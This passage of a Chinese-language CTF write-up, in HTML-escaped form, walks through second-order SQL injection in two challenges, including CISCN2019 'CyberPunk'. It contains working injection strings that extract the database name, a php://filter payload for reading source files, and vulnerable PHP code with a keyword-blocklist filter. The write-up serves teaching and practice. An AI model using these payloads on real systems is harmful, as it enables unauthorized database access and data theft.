class=&#34;subst&#34;&gt;$category&lt;/span&gt;&amp;#x27;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            content = &amp;#x27;&lt;span class=&#34;subst&#34;&gt;$content&lt;/span&gt;&amp;#x27;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            bo_id = &amp;#x27;&lt;span class=&#34;subst&#34;&gt;$bo_id&lt;/span&gt;&amp;#x27;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过上面代码分析，我们可以发现是存在二次注入，注入点在 category 中&lt;/p&gt;
&lt;p&gt;这边有点需要注意：虽然 addslashes 会转义’，但在插入数据库时转义字符 \ 并不会插入数据库&lt;/p&gt;
&lt;p&gt;接下来构造注入语句：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023180732878.png&#34; alt=&#34;image-20221023180732878&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这个 title 可以乱写，注入点在 category 中，首先先闭合原来的 category，然后去覆盖 content，因为如果直接注释，插入数据库会报列数不匹配的错误&lt;/p&gt;
&lt;p&gt;在覆盖的同时，我们的注入语句也在自己写的 content 中&lt;/p&gt;
&lt;p&gt;最后他给的 content 随便乱写，因为被我们写的注入语句的 content 覆盖了&lt;/p&gt;
&lt;p&gt;最后的语句为：&lt;/p&gt;
&lt;p&gt;insert into board set category = ‘a\’,content=database(),/*, title = ‘aa’,content = ‘aaaa’;&lt;/p&gt;
&lt;p&gt;此时’仍被转义，但插入数据库后转义符号消失，这就是为什么在下一个页面我们的 aaaa 正文能显示&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023181703773.png&#34; alt=&#34;image-20221023181703773&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来到 comment 页面，会根据刚刚的 title 查询出我们当时写的，即从数据库中取出 category，然后加上我们的提交的留言再次入库&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;category 取出来的时候是这么一串：a’,content=database (),/*，注意转义字符消失了&lt;/p&gt;
&lt;p&gt;然后我们需要去 content 闭合注释符，再用单行注入把后面没用的东西注释掉&lt;/p&gt;
&lt;p&gt;最后语句变为了&lt;/p&gt;
&lt;p&gt;sql =` &#34;insert into comment set category = &#39;a&#39;,content=database(),/*&#39;, content = &#39;*/#&#39;, bo_id = &#39;bo_id’&amp;quot;;`&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023181848314.png&#34; alt=&#34;image-20221023181848314&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到库名，下面的 getflag 操作不在赘述&lt;/p&gt;
&lt;h6 id=&#34;2ciscn2019-华北赛区-day1-web5cyberpunk&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2ciscn2019-华北赛区-day1-web5cyberpunk&#34;&gt;#&lt;/a&gt; 2.[CISCN2019 华北赛区 Day1 Web5] CyberPunk&lt;/h6&gt;
&lt;!--?file=?--&gt; 接收get传入的file参数，用php伪协议读源码
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?file=php://filter/read=convert.base64-encode/resource=index.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;修改地址存在二次注入，从数据库中取 old_address 时没有过滤&lt;/p&gt;
&lt;p&gt;分析 config.php，这是一个数据库连接配置文件，没有可以利用的地方，&lt;/p&gt;
&lt;p&gt;在 confirm.php 中，对 user_name 和 phone 进行了过滤，但 address 没有，说明 address 是可能存在注入点，然后将这三个插入到数据库中&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//confirm.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;require_once&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;config.php&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//var_dump($_POST);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;keyword&#34;&gt;empty&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;user_name&amp;quot;&lt;/span&gt;]) &amp;amp;&amp;amp; !&lt;span class=&#34;keyword&#34;&gt;empty&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;address&amp;quot;&lt;/span&gt;]) &amp;amp;&amp;amp; !&lt;span class=&#34;keyword&#34;&gt;empty&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;phone&amp;quot;&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$pattern&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$user_name&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;user_name&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$address&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;address&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phone&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;phone&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$pattern&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$user_name&lt;/span&gt;) || &lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$pattern&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$phone&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;no sql inject!&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;select * from `user` where `user_name`=&amp;#x27;&lt;span class=&#34;subst&#34;&gt;&amp;#123;$user_name&amp;#125;&lt;/span&gt;&amp;#x27; and `phone`=&amp;#x27;&lt;span class=&#34;subst&#34;&gt;&amp;#123;$phone&amp;#125;&lt;/span&gt;&amp;#x27;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$fetch&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$db&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$fetch&lt;/span&gt;-&amp;gt;num_rows&amp;gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$user_name&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;quot;已提交订单&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$re&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$db&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;prepare&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$re&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;bind_param&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;sss&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$user_name&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$address&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$phone&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$re&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$re&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;execute&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;variable&#34;&gt;$re&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;error&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;title function_ invoke__&#34;&gt;print_r&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$db&lt;/span&gt;-&amp;gt;error);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;订单提交成功&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在 change.php, 中 address 没有进行关键字过滤，只是使用 addslashes 进行转义后进行了查询，因此注入点不会在 select 语句中，&lt;/p&gt;
&lt;p&gt;但查询完后修改 address 时，旧的 address 从数据库拿出来没有进行过滤，二次注入发生&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//change.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;require_once&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;config.php&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;keyword&#34;&gt;empty&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;user_name&amp;quot;&lt;/span&gt;]) &amp;amp;&amp;amp; !&lt;span class=&#34;keyword&#34;&gt;empty&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;address&amp;quot;&lt;/span&gt;]) &amp;amp;&amp;amp; !&lt;span class=&#34;keyword&#34;&gt;empty&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;phone&amp;quot;&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$pattern&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$user_name&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;user_name&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$address&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;addslashes&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;address&amp;quot;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phone&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;phone&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$pattern&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$user_name&lt;/span&gt;) || &lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$pattern&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$phone&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;no sql inject!&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;select * from `user` where `user_name`=&amp;#x27;&lt;span class=&#34;subst&#34;&gt;&amp;#123;$user_name&amp;#125;&lt;/span&gt;&amp;#x27; and `phone`=&amp;#x27;&lt;span class=&#34;subst&#34;&gt;&amp;#123;$phone&amp;#125;&lt;/span&gt;&amp;#x27;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$fetch&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$db&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$fetch&lt;/span&gt;) &amp;amp;&amp;amp; &lt;span class=&#34;variable&#34;&gt;$fetch&lt;/span&gt;-&amp;gt;num_rows&amp;gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$fetch&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;fetch_assoc&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;update `user` set `address`=&amp;#x27;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$address&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27;, `old_address`=&amp;#x27;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;address&amp;#x27;&lt;/span&gt;].&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27; where `user_id`=&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;user_id&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$db&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;error&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;title function_ invoke__&#34;&gt;print_r&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$db&lt;/span&gt;-&amp;gt;error);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;订单修改成功&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;未找到订单!&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;信息不全&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
